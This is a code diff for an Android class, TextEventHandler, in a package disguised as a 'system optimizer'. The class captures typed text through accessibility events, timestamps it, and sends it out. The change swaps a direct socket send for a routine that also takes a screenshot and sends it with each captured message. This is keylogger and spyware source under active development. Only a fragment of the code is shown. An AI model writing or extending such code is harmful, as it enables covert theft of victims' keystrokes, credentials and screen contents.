@@ -5,7 +5,6 @@ import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 
-import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.text.BufferedLogger;
 
 import android.view.accessibility.AccessibilityEvent;
@@ -14,15 +13,21 @@ public class TextEventHandler {
 
     private final BufferedLogger logger;
     private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
+    private final ScreenshotEventHandler screenshotEventHandler;
 
-    public TextEventHandler(SocketManager socketManager) {
-        if (socketManager == null) {
-            throw new IllegalArgumentException("SocketManager cannot be null");
+    public TextEventHandler(ScreenshotEventHandler screenshotEventHandler) {
+        if (screenshotEventHandler == null) {
+            throw new IllegalArgumentException("ScreenshotEventHandler cannot be null");
         }
-        this.logger = new BufferedLogger((message) -> {
+        
+        this.screenshotEventHandler = screenshotEventHandler;
+        
+        // Consumer that triggers screenshot capture (which handles sending)
+        this.logger = new BufferedLogger((text) -> {
+            // Add timestamp and trigger screenshot capture - it will handle sending the message
             String timestamp = timestampFormat.format(new Date());
-            String messageWithTimestamp = "[" + timestamp + "] " + message;
-            socketManager.sendEvent("logger", messageWithTimestamp);
+            String messageWithTimestamp = "[" + timestamp + "] " + text;
+            screenshotEventHandler.captureAndSend(messageWithTimestamp);
         });
     }
 
@@ -30,7 +35,6 @@ public class TextEventHandler {
      * Handle accessibility events related to text input
      */
     public void onTextEvent(AccessibilityEvent event) {
-
         if (event == null || event.getText() == null)
             return;
 
